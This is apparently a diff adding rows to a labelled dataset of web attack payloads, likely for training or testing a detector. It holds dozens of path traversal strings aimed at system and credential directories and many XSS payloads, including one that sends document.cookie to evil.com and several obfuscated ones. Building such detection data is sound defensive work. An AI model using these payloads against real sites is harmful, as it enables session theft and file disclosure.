+..\\..\\AppData\\Local\\,PATH_TRAVERSAL
+.../.../var/tmp/,PATH_TRAVERSAL
+..%00/var/run/,PATH_TRAVERSAL
+../../../proc/self/fd/,PATH_TRAVERSAL
+../../../var/lib/php/sessions/sess_,PATH_TRAVERSAL
+..\..\..\Users\Public\,PATH_TRAVERSAL
+../../../../usr/share/doc/,PATH_TRAVERSAL
+../../../root/.gnupg/,PATH_TRAVERSAL
+..\..\..\ProgramData\,PATH_TRAVERSAL
+../../../../var/lib/docker/,PATH_TRAVERSAL
+../../../etc/nginx/sites-enabled/,PATH_TRAVERSAL
+..\..\..\inetpub\logs\,PATH_TRAVERSAL
+../../../../opt/lampp/htdocs/,PATH_TRAVERSAL
+../../../var/log/postgresql/,PATH_TRAVERSAL
+..\..\..\xampp\mysql\data\,PATH_TRAVERSAL
+../../../../usr/local/bin/,PATH_TRAVERSAL
+../../../var/spool/mail/,PATH_TRAVERSAL
+..\..\..\Windows\Fonts\,PATH_TRAVERSAL
+../../../../etc/php/7.4/,PATH_TRAVERSAL
+../../../var/opt/,PATH_TRAVERSAL
+..\..\..\Program Files (x86)\,PATH_TRAVERSAL
+../../../../lib64/,PATH_TRAVERSAL
+../../../usr/lib/python3/,PATH_TRAVERSAL
+..\..\..\Windows\assembly\,PATH_TRAVERSAL
+../../../../var/lib/redis/,PATH_TRAVERSAL
+../../../opt/java/,PATH_TRAVERSAL
+..\..\..\Windows\Downloaded Program Files\,PATH_TRAVERSAL
+../../../../usr/local/share/,PATH_TRAVERSAL
+../../../var/lib/mongodb/,PATH_TRAVERSAL
+..\..\..\Windows\SoftwareDistribution\,PATH_TRAVERSAL
+../../../../usr/lib64/,PATH_TRAVERSAL
+<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>,XSS
+<svg/onload=eval(atob('YWxlcnQoMSk='))>,XSS
+<iframe srcdoc='&#60;script&#62;alert(1)&#60;/script&#62;'>,XSS
+<audio src onloadstart=alert(1)>,XSS
+<input autofocus onfocus=alert(1)>,XSS
+<select autofocus onfocus=alert(1)><option>,XSS
+<textarea autofocus onfocus=alert(1)>,XSS
+<marquee onbounce=alert(1)>XSS,XSS
+<isindex action=javascript:alert(1) type=submit>,XSS
+<form><button formaction=javascript:alert(1)>CLICK,XSS
+"<object data=data:text/html,<script>alert(1)</script>>",XSS
+"<embed src=data:text/html,<script>alert(1)</script>>",XSS
+<math><mtext></mtext><mglyph><svg><foreignObject><body onload=alert(1)>>,XSS
+<table background=javascript:alert(1)>,XSS
+"<a href=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))>CLICK</a>",XSS
+<img src=x oneror=alert`1`>,XSS
+<style>*{background:url('javascript:alert(1)')}</style>,XSS
+"<link rel=import href=data:text/html,<script>alert(1)</script>>",XSS
+<body onbeforeunload=alert(1)>,XSS
+<body onblur=alert(1)>,XSS
+<body onchange=alert(1)>,XSS
+<body onclick=alert(1)>,XSS
+<body ondblclick=alert(1)>,XSS
+<body ondrag=alert(1)>,XSS
+<body ondragend=alert(1)>,XSS
+<body ondragenter=alert(1)>,XSS
+<body ondragleave=alert(1)>,XSS
+<body ondragover=alert(1)>,XSS
+<body ondragstart=alert(1)>,XSS
+<body ondrop=alert(1)>,XSS
+<body onerror=alert(1)>,XSS
+<body onfocus=alert(1)>,XSS
+<body oninput=alert(1)>,XSS
+<body onkeydown=alert(1)>,XSS
+<body onkeypress=alert(1)>,XSS
+<body onkeyup=alert(1)>,XSS
+<body onmousedown=alert(1)>,XSS
+<body onmouseenter=alert(1)>,XSS
+<body onmouseleave=alert(1)>,XSS
+<body onmousemove=alert(1)>,XSS
+<body onmouseout=alert(1)>,XSS
+<body onmouseover=alert(1)>,XSS
+<body onmouseup=alert(1)>,XSS
+<body onmousewheel=alert(1)>,XSS
+<body onpagehide=alert(1)>,XSS
+<body onreset=alert(1)>,XSS
